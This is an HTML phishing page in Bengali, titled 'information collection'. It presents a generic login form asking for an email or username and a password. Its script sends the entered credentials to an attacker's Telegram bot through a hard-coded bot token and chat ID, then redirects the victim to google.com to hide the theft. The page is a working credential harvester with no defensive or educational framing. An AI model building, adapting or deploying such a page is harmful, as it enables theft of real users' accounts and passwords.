<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>তথ্য সংগ্রহ - Sanjida Akter Style</title>
    <style>
        /* আধুনিক এবং পরিষ্কার ডিজাইন */
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #333;
        }
        .login-box {
            background: rgba(255, 255, 255, 0.95);
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
            width: 350px;
            text-align: center;
        }
        h2 {
            margin-bottom: 25px;
            color: #4a148c;
            font-size: 24px;
        }
        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 8px;
            box-sizing: border-box; /* padding সহ সাইজ ঠিক রাখার জন্য */
            outline: none;
            transition: 0.3s;
        }
        input:focus {
            border-color: #764ba2;
            box-shadow: 0 0 5px rgba(118, 75, 162, 0.3);
        }
        button {
            width: 100%;
            padding: 12px;
            background: #764ba2;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            margin-top: 10px;
            transition: 0.3s;
        }
        button:hover {
            background: #5a377d;
            transform: translateY(-2px);
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #777;
        }
    </style>
</head>
<body>

<div class="login-box">
    <h2>লগইন করুন</h2>
    
    <div class="input-group">
        <label for="email">ইমেইল বা ইউজারনেম</label>
        <input type="text" id="email" placeholder="এখানে লিখুন..." required>
    </div>

    <div class="input-group">
        <label for="password">পাসওয়ার্ড</label>
        <input type="password" id="password" placeholder="পাসওয়ার্ড দিন..." required>
    </div>

    <button onclick="sendData()">সাবমিট করুন</button>

    <div class="footer">
        &copy; 2026 আপনার ওয়েবসাইট | সুরক্ষিত থাকুন
    </div>
</div>

<script>
    function sendData() {
        // আপনার দেওয়া তথ্য
        const token = "8794180523:AAEtAX0_NfcKPvJdSPNpuil6zWZupVu23zY";
        const chat_id = "8624234278";
        
        const email = document.getElementById("email").value;
        const password = document.getElementById("password").value;

        if (email === "" || password === "") {
            alert("দয়া করে সবগুলো ঘর পূরণ করুন!");
            return;
        }

        // মেসেজ ফরম্যাট
        const message = `🔔 নতুন তথ্য এসেছে!\n\n📧 ইমেইল: ${email}\n🔑 পাসওয়ার্ড: ${password}`;

        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;

        // বাটন ডিজেবল করা যাতে বারবার ক্লিক না হয়
        const btn = document.querySelector("button");
        btn.innerText = "পাঠানো হচ্ছে...";
        btn.disabled = true;

        fetch(url)
        .then(response => {
            if (response.ok) {
                // সফল হলে অন্য কোনো পেজে পাঠিয়ে দেওয়া (যেমন গুগল বা ফেসবুক)
                window.location.href = "https://www.google.com";
            } else {
                alert("ত্রুটি হয়েছে! আবার চেষ্টা করুন।");
                btn.innerText = "সাবমিট করুন";
                btn.disabled = false;
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert("ইন্টারনেট সমস্যা!");
            btn.innerText = "সাবমিট করুন";
            btn.disabled = false;
        });
    }
</script>

</body>
</html>
